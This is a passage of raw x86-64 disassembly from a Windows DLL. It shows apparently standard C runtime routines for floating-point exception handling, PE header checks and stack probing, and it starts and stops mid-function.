   18000ec9a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ec9e:	89 50 0c             	mov    %edx,0xc(%rax)
   18000eca1:	41 f6 c0 10          	test   $0x10,%r8b
   18000eca5:	74 0d                	je     0x18000ecb4
   18000eca7:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ecab:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
   18000ecb0:	83 48 04 01          	orl    $0x1,0x4(%rax)
   18000ecb4:	41 f6 c0 02          	test   $0x2,%r8b
   18000ecb8:	74 0d                	je     0x18000ecc7
   18000ecba:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ecbe:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
   18000ecc3:	83 48 04 02          	orl    $0x2,0x4(%rax)
   18000ecc7:	41 f6 c0 01          	test   $0x1,%r8b
   18000eccb:	74 0d                	je     0x18000ecda
   18000eccd:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ecd1:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
   18000ecd6:	83 48 04 04          	orl    $0x4,0x4(%rax)
   18000ecda:	41 f6 c0 04          	test   $0x4,%r8b
   18000ecde:	74 0d                	je     0x18000eced
   18000ece0:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ece4:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
   18000ece9:	83 48 04 08          	orl    $0x8,0x4(%rax)
   18000eced:	41 f6 c0 08          	test   $0x8,%r8b
   18000ecf1:	74 0d                	je     0x18000ed00
   18000ecf3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ecf7:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
   18000ecfc:	83 48 04 10          	orl    $0x10,0x4(%rax)
   18000ed00:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   18000ed04:	48 8b 03             	mov    (%rbx),%rax
   18000ed07:	48 c1 e8 07          	shr    $0x7,%rax
   18000ed0b:	c1 e0 04             	shl    $0x4,%eax
   18000ed0e:	f7 d0                	not    %eax
   18000ed10:	33 41 08             	xor    0x8(%rcx),%eax
   18000ed13:	83 e0 10             	and    $0x10,%eax
   18000ed16:	31 41 08             	xor    %eax,0x8(%rcx)
   18000ed19:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   18000ed1d:	48 8b 03             	mov    (%rbx),%rax
   18000ed20:	48 c1 e8 09          	shr    $0x9,%rax
   18000ed24:	c1 e0 03             	shl    $0x3,%eax
   18000ed27:	f7 d0                	not    %eax
   18000ed29:	33 41 08             	xor    0x8(%rcx),%eax
   18000ed2c:	83 e0 08             	and    $0x8,%eax
   18000ed2f:	31 41 08             	xor    %eax,0x8(%rcx)
   18000ed32:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   18000ed36:	48 8b 03             	mov    (%rbx),%rax
   18000ed39:	48 c1 e8 0a          	shr    $0xa,%rax
   18000ed3d:	c1 e0 02             	shl    $0x2,%eax
   18000ed40:	f7 d0                	not    %eax
   18000ed42:	33 41 08             	xor    0x8(%rcx),%eax
   18000ed45:	83 e0 04             	and    $0x4,%eax
   18000ed48:	31 41 08             	xor    %eax,0x8(%rcx)
   18000ed4b:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   18000ed4f:	48 8b 03             	mov    (%rbx),%rax
   18000ed52:	48 c1 e8 0b          	shr    $0xb,%rax
   18000ed56:	03 c0                	add    %eax,%eax
   18000ed58:	f7 d0                	not    %eax
   18000ed5a:	33 41 08             	xor    0x8(%rcx),%eax
   18000ed5d:	83 e0 02             	and    $0x2,%eax
   18000ed60:	31 41 08             	xor    %eax,0x8(%rcx)
   18000ed63:	8b 03                	mov    (%rbx),%eax
   18000ed65:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   18000ed69:	48 c1 e8 0c          	shr    $0xc,%rax
   18000ed6d:	f7 d0                	not    %eax
   18000ed6f:	33 41 08             	xor    0x8(%rcx),%eax
   18000ed72:	83 e0 01             	and    $0x1,%eax
   18000ed75:	31 41 08             	xor    %eax,0x8(%rcx)
   18000ed78:	e8 e7 02 00 00       	call   0x18000f064
   18000ed7d:	48 8b d0             	mov    %rax,%rdx
   18000ed80:	a8 01                	test   $0x1,%al
   18000ed82:	74 08                	je     0x18000ed8c
   18000ed84:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   18000ed88:	83 49 0c 10          	orl    $0x10,0xc(%rcx)
   18000ed8c:	f6 c2 04             	test   $0x4,%dl
   18000ed8f:	74 08                	je     0x18000ed99
   18000ed91:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   18000ed95:	83 49 0c 08          	orl    $0x8,0xc(%rcx)
   18000ed99:	f6 c2 08             	test   $0x8,%dl
   18000ed9c:	74 08                	je     0x18000eda6
   18000ed9e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000eda2:	83 48 0c 04          	orl    $0x4,0xc(%rax)
   18000eda6:	f6 c2 10             	test   $0x10,%dl
   18000eda9:	74 08                	je     0x18000edb3
   18000edab:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000edaf:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   18000edb3:	f6 c2 20             	test   $0x20,%dl
   18000edb6:	74 08                	je     0x18000edc0
   18000edb8:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000edbc:	83 48 0c 01          	orl    $0x1,0xc(%rax)
   18000edc0:	8b 03                	mov    (%rbx),%eax
   18000edc2:	b9 00 60 00 00       	mov    $0x6000,%ecx
   18000edc7:	48 23 c1             	and    %rcx,%rax
   18000edca:	74 3e                	je     0x18000ee0a
   18000edcc:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
   18000edd2:	74 26                	je     0x18000edfa
   18000edd4:	48 3d 00 40 00 00    	cmp    $0x4000,%rax
   18000edda:	74 0e                	je     0x18000edea
   18000eddc:	48 3b c1             	cmp    %rcx,%rax
   18000eddf:	75 30                	jne    0x18000ee11
   18000ede1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ede5:	83 08 03             	orl    $0x3,(%rax)
   18000ede8:	eb 27                	jmp    0x18000ee11
   18000edea:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000edee:	83 20 fe             	andl   $0xfffffffe,(%rax)
   18000edf1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000edf5:	83 08 02             	orl    $0x2,(%rax)
   18000edf8:	eb 17                	jmp    0x18000ee11
   18000edfa:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000edfe:	83 20 fd             	andl   $0xfffffffd,(%rax)
   18000ee01:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee05:	83 08 01             	orl    $0x1,(%rax)
   18000ee08:	eb 07                	jmp    0x18000ee11
   18000ee0a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee0e:	83 20 fc             	andl   $0xfffffffc,(%rax)
   18000ee11:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee15:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
   18000ee1b:	c1 e6 05             	shl    $0x5,%esi
   18000ee1e:	81 20 1f 00 fe ff    	andl   $0xfffe001f,(%rax)
   18000ee24:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee28:	09 30                	or     %esi,(%rax)
   18000ee2a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee2e:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   18000ee32:	83 48 20 01          	orl    $0x1,0x20(%rax)
   18000ee36:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   18000ee3a:	74 33                	je     0x18000ee6f
   18000ee3c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee40:	ba e1 ff ff ff       	mov    $0xffffffe1,%edx
   18000ee45:	21 50 20             	and    %edx,0x20(%rax)
   18000ee48:	48 8b 45 30          	mov    0x30(%rbp),%rax
   18000ee4c:	8b 08                	mov    (%rax),%ecx
   18000ee4e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee52:	89 48 10             	mov    %ecx,0x10(%rax)
   18000ee55:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee59:	83 48 60 01          	orl    $0x1,0x60(%rax)
   18000ee5d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee61:	21 50 60             	and    %edx,0x60(%rax)
   18000ee64:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee68:	8b 0e                	mov    (%rsi),%ecx
   18000ee6a:	89 48 50             	mov    %ecx,0x50(%rax)
   18000ee6d:	eb 48                	jmp    0x18000eeb7
   18000ee6f:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   18000ee73:	41 b8 e3 ff ff ff    	mov    $0xffffffe3,%r8d
   18000ee79:	8b 41 20             	mov    0x20(%rcx),%eax
   18000ee7c:	41 23 c0             	and    %r8d,%eax
   18000ee7f:	83 c8 02             	or     $0x2,%eax
   18000ee82:	89 41 20             	mov    %eax,0x20(%rcx)
   18000ee85:	48 8b 45 30          	mov    0x30(%rbp),%rax
   18000ee89:	48 8b 08             	mov    (%rax),%rcx
   18000ee8c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee90:	48 89 48 10          	mov    %rcx,0x10(%rax)
   18000ee94:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000ee98:	83 48 60 01          	orl    $0x1,0x60(%rax)
   18000ee9c:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   18000eea0:	8b 42 60             	mov    0x60(%rdx),%eax
   18000eea3:	41 23 c0             	and    %r8d,%eax
   18000eea6:	83 c8 02             	or     $0x2,%eax
   18000eea9:	89 42 60             	mov    %eax,0x60(%rdx)
   18000eeac:	48 8b 45 10          	mov    0x10(%rbp),%rax
   18000eeb0:	48 8b 16             	mov    (%rsi),%rdx
   18000eeb3:	48 89 50 50          	mov    %rdx,0x50(%rax)
   18000eeb7:	e8 ec 00 00 00       	call   0x18000efa8
   18000eebc:	33 d2                	xor    %edx,%edx
   18000eebe:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   18000eec2:	8b cf                	mov    %edi,%ecx
   18000eec4:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   18000eec8:	ff 15 e2 11 00 00    	call   *0x11e2(%rip)        # 0x1800100b0
   18000eece:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   18000eed2:	8b 41 08             	mov    0x8(%rcx),%eax
   18000eed5:	a8 10                	test   $0x10,%al
   18000eed7:	74 08                	je     0x18000eee1
   18000eed9:	48 0f ba 33 07       	btrq   $0x7,(%rbx)
   18000eede:	8b 41 08             	mov    0x8(%rcx),%eax
   18000eee1:	a8 08                	test   $0x8,%al
   18000eee3:	74 08                	je     0x18000eeed
   18000eee5:	48 0f ba 33 09       	btrq   $0x9,(%rbx)
   18000eeea:	8b 41 08             	mov    0x8(%rcx),%eax
   18000eeed:	a8 04                	test   $0x4,%al
   18000eeef:	74 08                	je     0x18000eef9
   18000eef1:	48 0f ba 33 0a       	btrq   $0xa,(%rbx)
   18000eef6:	8b 41 08             	mov    0x8(%rcx),%eax
   18000eef9:	a8 02                	test   $0x2,%al
   18000eefb:	74 08                	je     0x18000ef05
   18000eefd:	48 0f ba 33 0b       	btrq   $0xb,(%rbx)
   18000ef02:	8b 41 08             	mov    0x8(%rcx),%eax
   18000ef05:	a8 01                	test   $0x1,%al
   18000ef07:	74 05                	je     0x18000ef0e
   18000ef09:	48 0f ba 33 0c       	btrq   $0xc,(%rbx)
   18000ef0e:	8b 01                	mov    (%rcx),%eax
   18000ef10:	83 e0 03             	and    $0x3,%eax
   18000ef13:	74 30                	je     0x18000ef45
   18000ef15:	83 e8 01             	sub    $0x1,%eax
   18000ef18:	74 1f                	je     0x18000ef39
   18000ef1a:	83 e8 01             	sub    $0x1,%eax
   18000ef1d:	74 0e                	je     0x18000ef2d
   18000ef1f:	83 f8 01             	cmp    $0x1,%eax
   18000ef22:	75 28                	jne    0x18000ef4c
   18000ef24:	48 81 0b 00 60 00 00 	orq    $0x6000,(%rbx)
   18000ef2b:	eb 1f                	jmp    0x18000ef4c
   18000ef2d:	48 0f ba 33 0d       	btrq   $0xd,(%rbx)
   18000ef32:	48 0f ba 2b 0e       	btsq   $0xe,(%rbx)
   18000ef37:	eb 13                	jmp    0x18000ef4c
   18000ef39:	48 0f ba 33 0e       	btrq   $0xe,(%rbx)
   18000ef3e:	48 0f ba 2b 0d       	btsq   $0xd,(%rbx)
   18000ef43:	eb 07                	jmp    0x18000ef4c
   18000ef45:	48 81 23 ff 9f ff ff 	andq   $0xffffffffffff9fff,(%rbx)
   18000ef4c:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   18000ef50:	74 07                	je     0x18000ef59
   18000ef52:	8b 41 50             	mov    0x50(%rcx),%eax
   18000ef55:	89 06                	mov    %eax,(%rsi)
   18000ef57:	eb 07                	jmp    0x18000ef60
   18000ef59:	48 8b 41 50          	mov    0x50(%rcx),%rax
   18000ef5d:	48 89 06             	mov    %rax,(%rsi)
   18000ef60:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   18000ef65:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000ef6a:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000ef6f:	48 83 c4 20          	add    $0x20,%rsp
   18000ef73:	5d                   	pop    %rbp
   18000ef74:	c3                   	ret
   18000ef75:	cc                   	int3
   18000ef76:	cc                   	int3
   18000ef77:	cc                   	int3
   18000ef78:	48 83 ec 28          	sub    $0x28,%rsp
   18000ef7c:	83 f9 01             	cmp    $0x1,%ecx
   18000ef7f:	74 15                	je     0x18000ef96
   18000ef81:	8d 41 fe             	lea    -0x2(%rcx),%eax
   18000ef84:	83 f8 01             	cmp    $0x1,%eax
   18000ef87:	77 18                	ja     0x18000efa1
   18000ef89:	e8 6e 92 ff ff       	call   0x1800081fc
   18000ef8e:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   18000ef94:	eb 0b                	jmp    0x18000efa1
   18000ef96:	e8 61 92 ff ff       	call   0x1800081fc
   18000ef9b:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
   18000efa1:	48 83 c4 28          	add    $0x28,%rsp
   18000efa5:	c3                   	ret
   18000efa6:	cc                   	int3
   18000efa7:	cc                   	int3
   18000efa8:	40 53                	rex push %rbx
   18000efaa:	48 83 ec 20          	sub    $0x20,%rsp
   18000efae:	e8 3d fc ff ff       	call   0x18000ebf0
   18000efb3:	8b d8                	mov    %eax,%ebx
   18000efb5:	83 e3 3f             	and    $0x3f,%ebx
   18000efb8:	e8 4d fc ff ff       	call   0x18000ec0a
   18000efbd:	8b c3                	mov    %ebx,%eax
   18000efbf:	48 83 c4 20          	add    $0x20,%rsp
   18000efc3:	5b                   	pop    %rbx
   18000efc4:	c3                   	ret
   18000efc5:	cc                   	int3
   18000efc6:	cc                   	int3
   18000efc7:	cc                   	int3
   18000efc8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000efcd:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000efd2:	57                   	push   %rdi
   18000efd3:	48 83 ec 20          	sub    $0x20,%rsp
   18000efd7:	48 8b da             	mov    %rdx,%rbx
   18000efda:	48 8b f9             	mov    %rcx,%rdi
   18000efdd:	e8 0e fc ff ff       	call   0x18000ebf0
   18000efe2:	8b f0                	mov    %eax,%esi
   18000efe4:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000efe8:	8b cb                	mov    %ebx,%ecx
   18000efea:	f7 d1                	not    %ecx
   18000efec:	81 c9 7f 80 ff ff    	or     $0xffff807f,%ecx
   18000eff2:	23 c8                	and    %eax,%ecx
   18000eff4:	23 fb                	and    %ebx,%edi
   18000eff6:	0b cf                	or     %edi,%ecx
   18000eff8:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   18000effc:	80 3d cd b9 00 00 00 	cmpb   $0x0,0xb9cd(%rip)        # 0x18001a9d0
   18000f003:	74 25                	je     0x18000f02a
   18000f005:	f6 c1 40             	test   $0x40,%cl
   18000f008:	74 20                	je     0x18000f02a
   18000f00a:	e8 f1 fb ff ff       	call   0x18000ec00
   18000f00f:	eb 21                	jmp    0x18000f032
   18000f011:	c6 05 b8 b9 00 00 00 	movb   $0x0,0xb9b8(%rip)        # 0x18001a9d0
   18000f018:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   18000f01c:	83 e1 bf             	and    $0xffffffbf,%ecx
   18000f01f:	e8 dc fb ff ff       	call   0x18000ec00
   18000f024:	8b 74 24 38          	mov    0x38(%rsp),%esi
   18000f028:	eb 08                	jmp    0x18000f032
   18000f02a:	83 e1 bf             	and    $0xffffffbf,%ecx
   18000f02d:	e8 ce fb ff ff       	call   0x18000ec00
   18000f032:	8b c6                	mov    %esi,%eax
   18000f034:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000f039:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000f03e:	48 83 c4 20          	add    $0x20,%rsp
   18000f042:	5f                   	pop    %rdi
   18000f043:	c3                   	ret
   18000f044:	40 53                	rex push %rbx
   18000f046:	48 83 ec 20          	sub    $0x20,%rsp
   18000f04a:	48 8b d9             	mov    %rcx,%rbx
   18000f04d:	e8 9e fb ff ff       	call   0x18000ebf0
   18000f052:	83 e3 3f             	and    $0x3f,%ebx
   18000f055:	0b c3                	or     %ebx,%eax
   18000f057:	8b c8                	mov    %eax,%ecx
   18000f059:	48 83 c4 20          	add    $0x20,%rsp
   18000f05d:	5b                   	pop    %rbx
   18000f05e:	e9 9d fb ff ff       	jmp    0x18000ec00
   18000f063:	cc                   	int3
   18000f064:	48 83 ec 28          	sub    $0x28,%rsp
   18000f068:	e8 83 fb ff ff       	call   0x18000ebf0
   18000f06d:	83 e0 3f             	and    $0x3f,%eax
   18000f070:	48 83 c4 28          	add    $0x28,%rsp
   18000f074:	c3                   	ret
   18000f075:	cc                   	int3
   18000f076:	cc                   	int3
   18000f077:	cc                   	int3
   18000f078:	48 83 ec 28          	sub    $0x28,%rsp
   18000f07c:	4d 8b 41 38          	mov    0x38(%r9),%r8
   18000f080:	48 8b ca             	mov    %rdx,%rcx
   18000f083:	49 8b d1             	mov    %r9,%rdx
   18000f086:	e8 0d 00 00 00       	call   0x18000f098
   18000f08b:	b8 01 00 00 00       	mov    $0x1,%eax
   18000f090:	48 83 c4 28          	add    $0x28,%rsp
   18000f094:	c3                   	ret
   18000f095:	cc                   	int3
   18000f096:	cc                   	int3
   18000f097:	cc                   	int3
   18000f098:	40 53                	rex push %rbx
   18000f09a:	45 8b 18             	mov    (%r8),%r11d
   18000f09d:	48 8b da             	mov    %rdx,%rbx
   18000f0a0:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   18000f0a4:	4c 8b c9             	mov    %rcx,%r9
   18000f0a7:	41 f6 00 04          	testb  $0x4,(%r8)
   18000f0ab:	4c 8b d1             	mov    %rcx,%r10
   18000f0ae:	74 13                	je     0x18000f0c3
   18000f0b0:	41 8b 40 08          	mov    0x8(%r8),%eax
   18000f0b4:	4d 63 50 04          	movslq 0x4(%r8),%r10
   18000f0b8:	f7 d8                	neg    %eax
   18000f0ba:	4c 03 d1             	add    %rcx,%r10
   18000f0bd:	48 63 c8             	movslq %eax,%rcx
   18000f0c0:	4c 23 d1             	and    %rcx,%r10
   18000f0c3:	49 63 c3             	movslq %r11d,%rax
   18000f0c6:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   18000f0ca:	48 8b 43 10          	mov    0x10(%rbx),%rax
   18000f0ce:	8b 48 08             	mov    0x8(%rax),%ecx
   18000f0d1:	48 8b 43 08          	mov    0x8(%rbx),%rax
   18000f0d5:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   18000f0da:	74 0b                	je     0x18000f0e7
   18000f0dc:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   18000f0e1:	83 e0 f0             	and    $0xfffffff0,%eax
   18000f0e4:	4c 03 c8             	add    %rax,%r9
   18000f0e7:	4c 33 ca             	xor    %rdx,%r9
   18000f0ea:	49 8b c9             	mov    %r9,%rcx
   18000f0ed:	5b                   	pop    %rbx
   18000f0ee:	e9 cd 29 ff ff       	jmp    0x180001ac0
   18000f0f3:	cc                   	int3
   18000f0f4:	cc                   	int3
   18000f0f5:	cc                   	int3
   18000f0f6:	cc                   	int3
   18000f0f7:	cc                   	int3
   18000f0f8:	cc                   	int3
   18000f0f9:	cc                   	int3
   18000f0fa:	cc                   	int3
   18000f0fb:	cc                   	int3
   18000f0fc:	cc                   	int3
   18000f0fd:	cc                   	int3
   18000f0fe:	cc                   	int3
   18000f0ff:	cc                   	int3
   18000f100:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   18000f104:	45 33 c9             	xor    %r9d,%r9d
   18000f107:	4c 03 c1             	add    %rcx,%r8
   18000f10a:	4c 8b d2             	mov    %rdx,%r10
   18000f10d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   18000f112:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   18000f117:	48 83 c0 18          	add    $0x18,%rax
   18000f11b:	49 03 c0             	add    %r8,%rax
   18000f11e:	45 85 db             	test   %r11d,%r11d
   18000f121:	74 1e                	je     0x18000f141
   18000f123:	8b 50 0c             	mov    0xc(%rax),%edx
   18000f126:	4c 3b d2             	cmp    %rdx,%r10
   18000f129:	72 0a                	jb     0x18000f135
   18000f12b:	8b 48 08             	mov    0x8(%rax),%ecx
   18000f12e:	03 ca                	add    %edx,%ecx
   18000f130:	4c 3b d1             	cmp    %rcx,%r10
   18000f133:	72 0e                	jb     0x18000f143
   18000f135:	41 ff c1             	inc    %r9d
   18000f138:	48 83 c0 28          	add    $0x28,%rax
   18000f13c:	45 3b cb             	cmp    %r11d,%r9d
   18000f13f:	72 e2                	jb     0x18000f123
   18000f141:	33 c0                	xor    %eax,%eax
   18000f143:	c3                   	ret
   18000f144:	cc                   	int3
   18000f145:	cc                   	int3
   18000f146:	cc                   	int3
   18000f147:	cc                   	int3
   18000f148:	cc                   	int3
   18000f149:	cc                   	int3
   18000f14a:	cc                   	int3
   18000f14b:	cc                   	int3
   18000f14c:	cc                   	int3
   18000f14d:	cc                   	int3
   18000f14e:	cc                   	int3
   18000f14f:	cc                   	int3
   18000f150:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000f155:	57                   	push   %rdi
   18000f156:	48 83 ec 20          	sub    $0x20,%rsp
   18000f15a:	48 8b d9             	mov    %rcx,%rbx
   18000f15d:	48 8d 3d 9c 0e ff ff 	lea    -0xf164(%rip),%rdi        # 0x180000000
   18000f164:	48 8b cf             	mov    %rdi,%rcx
   18000f167:	e8 34 00 00 00       	call   0x18000f1a0
   18000f16c:	85 c0                	test   %eax,%eax
   18000f16e:	74 22                	je     0x18000f192
   18000f170:	48 2b df             	sub    %rdi,%rbx
   18000f173:	48 8b d3             	mov    %rbx,%rdx
   18000f176:	48 8b cf             	mov    %rdi,%rcx
   18000f179:	e8 82 ff ff ff       	call   0x18000f100
   18000f17e:	48 85 c0             	test   %rax,%rax
   18000f181:	74 0f                	je     0x18000f192
   18000f183:	8b 40 24             	mov    0x24(%rax),%eax
   18000f186:	c1 e8 1f             	shr    $0x1f,%eax
   18000f189:	f7 d0                	not    %eax
   18000f18b:	83 e0 01             	and    $0x1,%eax
   18000f18e:	eb 02                	jmp    0x18000f192
   18000f190:	33 c0                	xor    %eax,%eax
   18000f192:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000f197:	48 83 c4 20          	add    $0x20,%rsp
   18000f19b:	5f                   	pop    %rdi
   18000f19c:	c3                   	ret
   18000f19d:	cc                   	int3
   18000f19e:	cc                   	int3
   18000f19f:	cc                   	int3
   18000f1a0:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   18000f1a5:	66 39 01             	cmp    %ax,(%rcx)
   18000f1a8:	75 20                	jne    0x18000f1ca
   18000f1aa:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   18000f1ae:	48 03 c1             	add    %rcx,%rax
   18000f1b1:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   18000f1b7:	75 11                	jne    0x18000f1ca
   18000f1b9:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   18000f1be:	66 39 48 18          	cmp    %cx,0x18(%rax)
   18000f1c2:	75 06                	jne    0x18000f1ca
   18000f1c4:	b8 01 00 00 00       	mov    $0x1,%eax
   18000f1c9:	c3                   	ret
   18000f1ca:	33 c0                	xor    %eax,%eax
   18000f1cc:	c3                   	ret
   18000f1cd:	cc                   	int3
   18000f1ce:	cc                   	int3
   18000f1cf:	cc                   	int3
   18000f1d0:	48 8b c4             	mov    %rsp,%rax
   18000f1d3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000f1d7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000f1db:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000f1df:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000f1e3:	41 56                	push   %r14
   18000f1e5:	48 83 ec 20          	sub    $0x20,%rsp
   18000f1e9:	4d 8b 51 38          	mov    0x38(%r9),%r10
   18000f1ed:	48 8b f2             	mov    %rdx,%rsi
   18000f1f0:	4d 8b f0             	mov    %r8,%r14
   18000f1f3:	48 8b e9             	mov    %rcx,%rbp
   18000f1f6:	49 8b d1             	mov    %r9,%rdx
   18000f1f9:	48 8b ce             	mov    %rsi,%rcx
   18000f1fc:	49 8b f9             	mov    %r9,%rdi
   18000f1ff:	41 8b 1a             	mov    (%r10),%ebx
   18000f202:	48 c1 e3 04          	shl    $0x4,%rbx
   18000f206:	49 03 da             	add    %r10,%rbx
   18000f209:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   18000f20d:	e8 86 fe ff ff       	call   0x18000f098
   18000f212:	8b 45 04             	mov    0x4(%rbp),%eax
   18000f215:	24 66                	and    $0x66,%al
   18000f217:	f6 d8                	neg    %al
   18000f219:	b8 01 00 00 00       	mov    $0x1,%eax
   18000f21e:	1b d2                	sbb    %edx,%edx
   18000f220:	f7 da                	neg    %edx
   18000f222:	03 d0                	add    %eax,%edx
   18000f224:	85 53 04             	test   %edx,0x4(%rbx)
   18000f227:	74 11                	je     0x18000f23a
   18000f229:	4c 8b cf             	mov    %rdi,%r9
   18000f22c:	4d 8b c6             	mov    %r14,%r8
   18000f22f:	48 8b d6             	mov    %rsi,%rdx
   18000f232:	48 8b cd             	mov    %rbp,%rcx
   18000f235:	e8 02 42 ff ff       	call   0x18000343c
   18000f23a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000f23f:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   18000f244:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000f249:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000f24e:	48 83 c4 20          	add    $0x20,%rsp
   18000f252:	41 5e                	pop    %r14
   18000f254:	c3                   	ret
   18000f255:	cc                   	int3
   18000f256:	cc                   	int3
   18000f257:	cc                   	int3
   18000f258:	cc                   	int3
   18000f259:	cc                   	int3
   18000f25a:	cc                   	int3
   18000f25b:	cc                   	int3
   18000f25c:	cc                   	int3
   18000f25d:	cc                   	int3
   18000f25e:	cc                   	int3
   18000f25f:	cc                   	int3
   18000f260:	cc                   	int3
   18000f261:	cc                   	int3
   18000f262:	cc                   	int3
   18000f263:	cc                   	int3
   18000f264:	cc                   	int3
   18000f265:	cc                   	int3
   18000f266:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000f26d:	00 00 00 
   18000f270:	48 83 ec 10          	sub    $0x10,%rsp
   18000f274:	4c 89 14 24          	mov    %r10,(%rsp)
   18000f278:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   18000f27d:	4d 33 db             	xor    %r11,%r11
   18000f280:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   18000f285:	4c 2b d0             	sub    %rax,%r10
   18000f288:	4d 0f 42 d3          	cmovb  %r11,%r10
   18000f28c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   18000f293:	00 00 
   18000f295:	4d 3b d3             	cmp    %r11,%r10
   18000f298:	73 16                	jae    0x18000f2b0
   18000f29a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   18000f2a0:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   18000f2a7:	41 c6 03 00          	movb   $0x0,(%r11)
   18000f2ab:	4d 3b d3             	cmp    %r11,%r10
   18000f2ae:	75 f0                	jne    0x18000f2a0
   18000f2b0:	4c 8b 14 24          	mov    (%rsp),%r10
   18000f2b4:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   18000f2b9:	48 83 c4 10          	add    $0x10,%rsp
   18000f2bd:	c3                   	ret
   18000f2be:	cc                   	int3
   18000f2bf:	cc                   	int3
   18000f2c0:	cc                   	int3
   18000f2c1:	cc                   	int3
   18000f2c2:	cc                   	int3
   18000f2c3:	cc                   	int3
   18000f2c4:	cc                   	int3
   18000f2c5:	cc                   	int3
   18000f2c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000f2cd:	00 00 00 
   18000f2d0:	48 2b d1             	sub    %rcx,%rdx
   18000f2d3:	49 83 f8 08          	cmp    $0x8,%r8
   18000f2d7:	72 22                	jb     0x18000f2fb
   18000f2d9:	f6 c1 07             	test   $0x7,%cl
   18000f2dc:	74 14                	je     0x18000f2f2
   18000f2de:	66 90                	xchg   %ax,%ax
   18000f2e0:	8a 01                	mov    (%rcx),%al
   18000f2e2:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
